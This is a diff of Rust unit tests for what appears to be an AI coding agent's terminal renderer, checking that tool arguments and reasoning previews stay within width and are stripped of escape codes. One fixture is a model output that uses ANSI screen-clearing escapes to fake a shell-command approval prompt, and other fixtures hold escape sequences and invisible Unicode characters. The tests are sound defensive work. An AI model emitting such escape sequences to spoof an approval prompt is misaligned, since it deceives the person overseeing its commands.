+    /// is drawn, not only on the first.
+    #[test]
+    fn a_thinking_preview_carries_no_escapes_from_below_the_first_line() {
+        let reasoning =
+            "Checking the file.\n\u{1b}[2J\u{1b}[1;1H[approval] shell_execute cat README (Y/n)";
+        let preview: String = super::thinking_preview_runs(reasoning)
+            .iter()
+            .map(|run| run.text.as_str())
+            .collect();
+        assert!(!preview.contains('\u{1b}'), "{preview:?}");
+        assert!(preview.starts_with("Checking the file."), "{preview:?}");
+    }
+
+    /// An indent proportional to depth would reach the width and leave nothing for the value; past
+    /// the ceiling the block stops indenting rather than stops informing.
+    #[test]
+    fn nesting_past_the_indent_ceiling_still_shows_the_value() {
+        let mut deep = serde_json::json!({"k": "PAYLOAD"});
+        for _ in 0..14 {
+            deep = serde_json::json!([deep]);
+        }
+        let width = 40;
+        let rendered = super::render_whole_params(&serde_json::json!({"a": deep}), width);
+        let indents: Vec<usize> = rendered
+            .iter()
+            .map(|line| line.len() - line.trim_start_matches(' ').len())
+            .collect();
+        assert!(
+            indents.iter().all(|indent| *indent <= width / 2),
+            "indent grew past the ceiling: {indents:?}"
+        );
+        assert!(
+            rendered.iter().any(|line| line.trim() == "-"),
+            "bullets vanished: {rendered:?}"
+        );
+        assert!(
+            rendered.iter().any(|line| line.contains("k: PAYLOAD")),
+            "the value at the bottom was swallowed: {rendered:?}"
+        );
+    }
+
+    #[test]
+    fn a_tool_with_no_parameters_renders_no_block() {
+        assert!(super::render_whole_params(&serde_json::json!({}), TEST_WIDTH).is_empty());
+    }
+
+    /// A value too wide for its key line is wrapped under a bare `key:` with nothing cut, so a
+    /// long path keeps the filename a reader is looking for.
+    #[test]
+    fn a_long_path_value_in_a_block_wraps_and_keeps_its_filename() {
+        let rendered = super::render_whole_params(
+            &serde_json::json!({
+                "path": "/home/you/projects/meka/docs/book/src/configuration/config-file.md"
+            }),
+            40,
+        );
+        assert_eq!(
+            rendered.first().map(String::as_str),
+            Some("  path:"),
+            "{rendered:?}"
+        );
+        assert!(rendered.concat().contains("config-file.md"), "{rendered:?}");
+        assert!(
+            rendered
+                .iter()
+                .all(|row| super::display_width(row) <= 40 && !row.contains("...")),
+            "{rendered:?}"
+        );
+    }
+
+    /// No row of an argument block exceeds the width it was given or starts at column zero,
+    /// whatever the model put in the call: escapes, zero-width floods, deep nesting, hundreds of
+    /// arguments, a bare array or string for an input.
+    #[test]
+    fn no_block_row_ever_exceeds_the_width_it_was_given() {
+        let nasty = [
+            "plain",
+            &"x".repeat(500),
+            &"漢".repeat(300),
+            &"😀".repeat(200),
+            "tab\tseparated\tvalues",
+            "line one\nline two\nline three",
+            "carriage\rreturn",
+            "\u{1b}[2J\u{1b}[1;1Hescape",
+            "\u{00ad}\u{200b}\u{202e}\u{feff}",
+            "",
+            "   ",
+        ];
+        let long_key = "k".repeat(300);
+        let mut deep = serde_json::json!("SECRET_PAYLOAD");
+        for level in 0..25 {
+            deep = serde_json::json!({ format!("k{}", level): deep });
+        }
+        let mut deep_array = serde_json::json!("SECRET_PAYLOAD");
+        let mut deep_records = serde_json::json!({"k": "SECRET_PAYLOAD"});
+        for _ in 0..25 {
+            deep_array = serde_json::json!([deep_array]);
+            deep_records = serde_json::json!([deep_records]);
+        }
+        let many_arguments = serde_json::Value::Object(
+            (0..300)
+                .map(|index| (format!("o{index:03}"), serde_json::json!("v")))
+                .collect(),
+        );
+        let inputs = [
+            deep,
+            many_arguments,
+            deep_array.clone(),
+            deep_records.clone(),
+            serde_json::json!({ "nest": deep_array }),
+            serde_json::json!({ "nest": deep_records }),
+            serde_json::json!({"vs": "1\u{fe0f}".repeat(300)}),
+            serde_json::json!({"keycap": "1\u{fe0f}\u{20e3}".repeat(200)}),
+            serde_json::json!({"invisible": "\u{2800}\u{fe0f}".repeat(200)}),
+            serde_json::json!({"tabbed": "\tif ok {\n\t\treturn VeryLongConstantWithoutSpaces\n\t}"}),
+            serde_json::json!({"nasty": nasty.map(serde_json::Value::from).to_vec()}),
+            serde_json::json!({}),
+            serde_json::json!({"path": "src/render.rs", "content": "a\nb\nc"}),
+            serde_json::json!({&long_key: "value", "second": "another"}),
+            serde_json::json!(["bare", "array", "\u{1b}[2Jelement"]),
+            serde_json::json!("a bare string input"),
+            serde_json::json!({"nested": {"deep": {"deeper": "漢".repeat(400)}}}),
+        ];
+        for width in [MIN_OUTPUT_WIDTH, 21, 25, 40, 80, 100, 200] {
+            for input in &inputs {
+                for line in super::render_whole_params(input, width) {
+                    assert!(
+                        super::display_width(&line) <= width,
+                        "block at width {width}: {} columns in {line:?}",
+                        super::display_width(&line)
+                    );
+                    assert!(
+                        line.starts_with(super::TOOL_PARAM_INDENT),
+                        "block row at column zero: {line:?}"
+                    );
+                    assert!(
+                        !line.contains('\u{1b}'),
+                        "an escape reached a row: {line:?}"
+                    );
+                }
+            }
+        }
     }
 }
